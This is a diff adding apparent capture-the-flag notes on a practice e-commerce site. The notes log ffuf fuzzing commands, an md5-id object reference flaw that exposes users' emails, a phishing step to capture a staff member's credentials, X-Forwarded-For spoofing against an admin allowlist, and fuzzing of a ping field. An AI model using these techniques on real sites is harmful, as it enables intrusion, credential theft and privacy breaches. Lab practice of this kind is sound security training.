@@ -1,0 +1,112 @@
+Domain: www.vulncommerce.co.uk
+Ip: 68.183.255.206
+"Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjljMzNjOTAyM2M4NzRjNGM0MTgwYzBiMDg2NGJmMTE1In0="
+server: nginx/1.21.1
+
+nslookup:
+nslookup -type=any vulncommerce.co.uk 8.8.8.8
+#1 FLAG
+
+dnsrecon:
+dnsrecon -d vulncommerce.co.uk -D ~/wordlist/subdomains.txt -t brt
+//Subdomains found: 
+
+
+----------------Content discovery-------------------------------------------
+ffuf -H "Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjljMzNjOTAyM2M4NzRjNGM0MTgwYzBiMDg2NGJmMTE1In0="  -w ~/wordlists/content.txt -u "http://vulncommerce.co.uk/FUZZ?session_id=ZWFiNjdjMjY4NTQyOTE3Y2I1OWVhZGQzNjY1MmZjNjE2Yjc4MTc3NDNlZmU3YWIyMzY0NzM5ZmJjYWZjZDBjY2MwY2ZjOTdlYTVjZGI3NTI2OTgyNDU4ZTFkZWRkNDc0ODc2YzAyNjlhNTU5OThkZWQxMDhlZDcyMDkzNWM1MWE=" -t 1 -p 0.1 -mc all -fc 404 -c
+
+
+vulncommerce.co.uk: basket, login, logout, profile, stats
+
+---------------------------main page----------------------------------------
+/:
+//visible session id:
+session_id=ZWFiNjdjMjY4NTQyOTE3Y2I1OWVhZGQzNjY1MmZjNjE2Yjc4MTc3NDNlZmU3YWIyMzY0NzM5ZmJjYWZjZDBjY2MwY2ZjOTdlYTVjZGI3NTI2OTgyNDU4ZTFkZWRkNDc0ODc2YzAyNjlhNTU5OThkZWQxMDhlZDcyMDkzNWM1MWE=
+
+//Weird latin text in homepage:
+translation:
+"The pain itself is love, the main storage system. Until the immune system, and not the ugly and the finch the arrows, the players gas the mourning in the backyard But he put down the lake. You're only a couch"
+
+products: 
+//List of products
+
+basket:
+//Perform actions on basket.
+//Purchase items giving Address details and Payment details.
+
+login:
+//"Username not recognised"
+
+//There is an img source
+/upload_dir_34f9gGo:
+
+//all uploads
+/tech/uploads.txt
+#3 FLAG Found
+
+### UPDATES ###
+
+1) Server migration is now complete, Clients requests first go to the load balancer and will then be forwarded to an available server. We currently only have one server but will add some more soon.
+
+2) We've setup a test page at "/email-signup-trial" to accept emails for newsletters. Please give it a try and let us know if you have problems.
+
+-----------------------------/email-signup-trial----------------------------
+//singing in for a newsletter.
+
+//reply went to spam section...
+Please click the following link to confirm the status of your email subscription http://www.vulncommerce.co.uk/email-status/74/ad61ab143223efbc24c7d2583be69251 
+
+//Redirecting...
+id: 74
+status: not confirmed.
+email: *t***3***@*m*i*.*o*
+
+//Notice we can get other users details by changing id and hash.
+ad61ab143223efbc24c7d2583be69251	md5	74
+//hashes are md5 converted id's. 
+//Let's break in...
+
+Id: 8
+Status: Confirmed
+Email: simon.boswell@vulncommerce.co.uk
+Name: 
+#4 FLAG Found
+
+
+//There is no email page. Let's send an email to Simon.
+//Sent email with login page.His credentials are saved within the session id
+//Visiting page vulncommerce.co.uk/profile?sessioid=
+#5 FLAG Found
+
+
+//Message from Admin:
+Hi Simon, i've setup an application to manage the server. I've given it a random name to keep the nasty hackers away /adm1n-man4gem3nt-12bfb3
+
+There's no username and password for it because the only place you can view it from is HQ ( so don't tell anyone else in the office)
+
+---------------------------/adm1n-man4gem3nt-12bfb3-------------------------
+Connection from (my ip) not allowed.
+
+//We will need to open this page from HQ.
+server: nginx/1.21.1
+IP: 68.183.255.206
+nameserver = ns1.digitalocean.com
+IP: 139.59.142.21
+
+ffuf -H "X-Forwarded-For: FUZZ" -H "Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjljMzNjOTAyM2M4NzRjNGM0MTgwYzBiMDg2NGJmMTE1In0="  -w ~/ip.txt -u "http://www.vulncommerce.co.uk/adm1n-man4gem3nt-12bfb3" -H "Content-Type: application/x-www-form-urlencoded" -t 1 -p 0.1 -mc all -fc 404 -c -fr "Connection from FUZZ"
+
+
+----------------------------login-------------------------------------------
+//login form uses csrf protection token
+//login page freezes for 3600 sec after unsuccessful attempt
+//it's no use FUZZing it. 
+//username:admin exists.
+
+----------------------------stats-------------------------------------------
+//Server Status
+
+#2 FLAG Found
+
+
+//Testing Ip's 
+ffuf -X POST -d "ping_target=FUZZ" -H "Cookie: ctfchallenge=PREMIUMeyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPblJ5ZFdWOSIsInZlcmlmeSI6IjljMzNjOTAyM2M4NzRjNGM0MTgwYzBiMDg2NGJmMTE1In0="  -w ~/ip.txt -u "http://www.vulncommerce.co.uk/stats" -H "Content-Type: application/x-www-form-urlencoded" -t 1 -p 0.1 -mc all -fc 404 -c -fr "PASS"
